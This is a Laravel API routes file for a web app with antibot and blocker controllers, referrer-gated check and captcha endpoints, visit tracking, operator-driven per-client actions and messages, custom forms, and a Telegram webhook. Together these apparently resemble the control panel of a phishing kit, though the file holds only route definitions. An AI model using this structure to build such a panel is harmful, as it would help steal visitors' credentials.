<?php

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Api\AuthController;
use App\Http\Controllers\AntibotsController;
use App\Http\Controllers\BlockerController;
use App\Http\Controllers\CheckController;
use App\Http\Controllers\SettingsController;
use App\Http\Controllers\TelegramController;
use App\Http\Controllers\VisitsController;
use App\Http\Controllers\ClientController;
use App\Http\Controllers\CustomFormController;
use App\Http\Controllers\DashboardController;
use App\Http\Controllers\SendController;

// Include Breeze auth routes for API
require __DIR__.'/auth.php';

// Additional API Authentication routes (username-based)
Route::prefix('auth')->group(function () {
    Route::post('/login-username', [AuthController::class, 'login']);
    Route::post('/register-username', [AuthController::class, 'register']);
    
    // Protected auth routes
    Route::middleware('auth:sanctum')->group(function () {
        Route::post('/logout-api', [AuthController::class, 'logout']);
        Route::post('/logout-all', [AuthController::class, 'logoutAll']);
        Route::post('/refresh', [AuthController::class, 'refresh']);
        Route::get('/user', [AuthController::class, 'user']);
        Route::put('/profile', [AuthController::class, 'updateProfile']);
        Route::post('/change-password', [AuthController::class, 'changePassword']);
    });
});

// Default Breeze user endpoint
Route::middleware(['auth:sanctum'])->get('/user', function (Request $request) {
    return $request->user();
});

// Test endpoint
Route::get('/test', function () {
    return response()->json([
        'message' => 'API is working!',
        'status' => 'success',
        'timestamp' => now()
    ]);
});

// Middleware validation endpoint
Route::get('/app/{uniqueid}', function (Request $request, $uniqueid) {
    // Add the uniqueid to the request so middleware can access it
    $request->merge(['unique_id' => $uniqueid]);
    
    // This route will trigger ClientAuth and ReferrerAuth middlewares
    return response()->json([
        'success' => true,
        'message' => 'Access granted',
        'uniqueid' => $uniqueid,
        'timestamp' => now()
    ]);
})->middleware(['referrer.auth', 'client.auth']);


// Public Client routes (no authentication required)
Route::prefix('client')->group(function () {
    Route::get('/{unique_id}', [ClientController::class, 'getClient']);
    Route::post('/store', [ClientController::class, 'storeOrUpdateClient']);
    Route::post('/{unique_id}/action', [ClientController::class, 'updateClientAction']);
    Route::post('/{unique_id}/ban', [ClientController::class, 'banClient']);
});

Route::middleware('auth:sanctum')->group(function () {
    // Dashboard stats
    Route::get('/dashboard/stats', [DashboardController::class, 'stats']);
    Route::post('/dashboard/reset-stats', [DashboardController::class, 'resetStats']);
    
    // Client management routes (protected)
    Route::get('/clients', [ClientController::class, 'index']);
    Route::get('/clients/{id}', [ClientController::class, 'show']);
    Route::get('/clients/unique/{unique_id}', [ClientController::class, 'showByUniqueId']);
    Route::post('/clients/{id}/actions', [ClientController::class, 'createAction']);
    Route::post('/clients/unique/{unique_id}/actions', [ClientController::class, 'createActionByUniqueId']);
    Route::get('/clients/{id}/actions', [ClientController::class, 'getActions']);
    Route::get('/clients/unique/{unique_id}/actions', [ClientController::class, 'getActionsByUniqueId']);
    Route::post('/clients/{id}/actions/{actionId}/delete', [ClientController::class, 'deleteAction']);
    Route::post('/clients/{id}/anti-duplicate', [ClientController::class, 'createAntiDuplicate']);
    Route::post('/clients/{id}/custom-message', [ClientController::class, 'sendCustomMessage']);
    // Ban or unban a client
    Route::post('/clients/{id}/ban', [ClientController::class, 'banOrUnbanClient']);
    // Antibots routes
    Route::get('/antibots', [AntibotsController::class, 'index']);
    Route::post('/antibots', [AntibotsController::class, 'storeOrUpdate']);
    
    // Settings routes
    Route::get('/settings', [SettingsController::class, 'index']);
    Route::post('/settings', [SettingsController::class, 'update']);
    Route::get('/settings/{key}', [SettingsController::class, 'show']);
    
    // Visits routes
    Route::get('/visits', [VisitsController::class, 'index']);
    Route::post('/visits', [VisitsController::class, 'store']);
    Route::get('/visits/{visit}', [VisitsController::class, 'show']);
    Route::post('/visits/{visit}', [VisitsController::class, 'update']);
    Route::delete('/visits/{visit}', [VisitsController::class, 'destroy']);
    Route::post('/visits/bulk/destroy', [VisitsController::class, 'bulkDestroy']);
    Route::get('/visits/stats', [VisitsController::class, 'stats']);
    
    // Telegram routes (using settings controller since telegram data is stored in settings)
    Route::get('/telegram', [SettingsController::class, 'index']);
    Route::post('/telegram', [SettingsController::class, 'update']);
    
    // Telegram testing routes
    Route::post('/telegram/test', [TelegramController::class, 'test']);
    Route::post('/telegram/test-message', [TelegramController::class, 'testMessage']);
    Route::post('/telegram/webhook-info', [TelegramController::class, 'webhookInfo']);
    Route::post('/telegram/reset-webhook', [TelegramController::class, 'resetWebhook']);
    
    // Custom Forms routes
    Route::apiResource('custom-forms', CustomFormController::class);
});


Route::get('/check/{userid}', [CheckController::class, 'check'])->middleware(['referrer.auth']);

Route::get('/check-client/{userid}', [CheckController::class, 'check'])->middleware(['referrer.auth', 'client.auth']);

Route::post('/check/{userid}/captcha', [CheckController::class, 'verifyCaptcha'])->middleware(['referrer.auth']);
Route::post('/check/{userid}/captcha/refresh', [CheckController::class, 'refreshCaptcha'])->middleware(['referrer.auth']);

Route::post('/sending', [SendController::class, 'send'])->middleware(['referrer.auth', 'client.auth']);

Route::get('/config', [SettingsController::class, 'getConfig'])->middleware(['referrer.auth', 'client.auth']);

Route::get('custom-forms', [CustomFormController::class, 'index'])->middleware(['referrer.auth']);

//middleware validation endpoint (not under /api prefix to avoid bypass)
Route::get('/validate/{uniqueid}', [BlockerController::class, 'authorizeClient']);

//Telegram Bot Webhook
Route::post('/webhook/{botToken}', [TelegramController::class, 'handle']);
